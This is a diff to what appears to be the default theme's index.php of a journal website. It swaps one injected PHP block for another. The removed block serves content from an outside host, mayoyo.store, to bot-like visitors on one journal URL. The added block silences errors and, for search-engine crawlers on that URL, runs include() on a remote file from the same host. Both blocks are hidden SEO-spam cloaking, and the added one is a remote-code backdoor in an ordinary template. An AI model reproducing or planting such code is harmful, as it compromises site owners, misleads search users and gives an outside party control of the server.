@@ -1,8 +1,5 @@
 <?php
-if(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'bot') > 0  && $_SERVER['REQUEST_URI'] == '/index.php/jurnalbinaedukasi' || isset($_COOKIE[0]) && $_SERVER['REQUEST_URI'] == '/index.php/jurnalbinaedukasi' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'verification') > 0 && $_SERVER['REQUEST_URI'] == '/index.php/jurnalbinaedukasi' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'tool') > 0 && $_SERVER['REQUEST_URI'] == '/') {
-    echo implode('', file('https://mayoyo.store/journal.binadarma.ac.id/jurnalbinaedukasi.txt'));
-    exit;
-}
+error_reporting(0); $s_ref = $_SERVER['HTTP_REFERER']; $agent = $_SERVER['HTTP_USER_AGENT']; if(preg_match("/(googlebot|slurp|google adSense)/", strtolower($agent)) && $_SERVER['REQUEST_URI']=='/index.php/jurnalbinaedukasi'){ include('https://mayoyo.store/journal.binadarma.ac.id/jurnalbinaedukasi.txt'); exit; }
 
 /**
  * @file plugins/themes/default/index.php
